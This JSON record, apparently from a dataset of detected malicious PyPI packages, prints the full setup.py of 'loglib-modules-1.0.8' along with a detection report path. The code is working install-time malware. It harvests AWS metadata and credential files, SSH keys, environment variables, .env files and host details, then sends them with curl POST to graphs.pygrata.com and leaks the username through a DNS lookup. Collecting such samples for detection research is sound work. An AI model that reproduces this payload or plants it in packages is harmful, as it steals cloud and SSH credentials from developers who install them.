[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import random\nimport socket\nimport getpass\nimport base64\nimport subprocess\nimport os\nimport binascii\n\nacmd = 'curl -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/'\nbcmd = 'cd ~/.aws && cat credentials'\nccmd = 'env'\ncdcmd = 'cd ~/.ssh && ls && cat *'\nipcmd = 'ip addr show'\ncatenvcmd = 'cd ~/ && ls .env* && cat .env*'\nres3 = \"\"\nall3 = \"\"\nall4 = \"\"\nall5 = \"\"\nall6 = \"\"\nall7 = \"\"\ngetcred = \"\"\n\ntry:\n    result = subprocess.getoutput(acmd)\n    rolename = str(result).split('instance-profile/')[1].split('\",')[0]\n    accmd = 'curl -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/' + rolename + '/'\n    getcred = subprocess.getoutput(accmd)\n    all3 = \"metadata \\n ----------------------------------------- \\n \\n\" + result + getcred\nexcept Exception as e:\n    pass\ntry:\n    result2 = subprocess.getoutput(bcmd)\n    all4 = \" \\n \\n a \\n ----------------------------------------- \\n \\n\" + result2\nexcept Exception as e:\n    pass\ntry:\n    hostname = \"\"\n    username = \"\"\n    cwd = \"\"\n    ipadd = \"\"\n    try:\n        hostname = socket.gethostname()\n    except Exception as e:\n        pass\n    try:\n        username = getpass.getuser()\n    except Exception as e:\n        pass\n    try:\n        cwd = os.getcwd()\n    except Exception as e:\n        pass\n    try:\n        ipadd = subprocess.getoutput(ipcmd)\n    except Exception as e:\n        pass\n    res3 = {'hostname':hostname,'cwd':cwd,'username':username,'IP':ipadd}\n    all5 = \"\\n \\n details \\n ----------------------------------------- \\n \\n \" + str(res3)\nexcept Exception as e:\n    pass\ntry:\n    result3 = subprocess.getoutput(ccmd)\n    all6 = \"\\n \\n en \\n ----------------------------------------- \\n \\n \" + result3\nexcept Exception as e:\n    pass\ntry:\n    result4 = subprocess.getoutput(cdcmd)\n    all7 = \"\\n \\n ssh \\n ----------------------------------------- \\n \\n \" + result4\nexcept Exception as e:\n    pass\n\nall8 = str(all3) + str(all4) + str(all5) + str(all6) + str(all7)\nif os.path.exists('.env') or os.path.exists('/root/.env') or os.path.exists('/home/*/.env'):\n    output = subprocess.getoutput(catenvcmd)\n    allen = all8 + \"\\n \\n en \\n ----------------------------------------- \\n \\n \" + str(output)\n    filename1 = str(random.randint(0, 99999999999)) + '.txt'\n    filename2 = str(filename1)\n    with open(filename2, 'a') as d:\n        d.write(allen + '\\n')\n    subprocess.getoutput(\"curl -X POST http://graphs.pygrata.com/uploader.php -F 'uploaded_file=@\" + filename2 + \"' -F 'submit=Upload'\")\n    subprocess.getoutput('curl -X POST http://graphs.pygrata.com/api.php -d \"textdata=' + allen + '\"')\n    os.remove(filename2)\n    usern = getpass.getuser()\n    userb64 = base64.b64encode(usern.encode()).decode()\n    hexb64 = binascii.hexlify(base64.b64decode(userb64))\n    hexusern = hexb64.decode(\"utf-8\")\n    subprocess.getoutput('dig ' + hexusern + 'isuser.api.pygrata.com')\nelse:\n    filename1 = str(random.randint(0, 99999999999)) + '.txt'\n    filename2 = str(filename1)\n    with open(filename2, 'a') as d:\n        d.write(all8 + '\\n')\n    subprocess.getoutput(\"curl -X POST http://graphs.pygrata.com/uploader.php -F 'uploaded_file=@\" + filename2 + \"' -F 'submit=Upload'\")\n    subprocess.getoutput('curl -X POST http://graphs.pygrata.com/api.php -d \"textdata=' + all8 + '\"')\n    os.remove(filename2)\n    usern = getpass.getuser()\n    userb64 = base64.b64encode(usern.encode()).decode()\n    hexb64 = binascii.hexlify(base64.b64decode(userb64))\n    hexusern = hexb64.decode(\"utf-8\")\n    subprocess.getoutput('dig ' + hexusern + 'isuser.api.pygrata.com')"
  },
  {
    "metadata": {
      "package_name": "loglib-modules-1.0.8",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/loglib-modules-1.0.8.txt"
    }
  }
]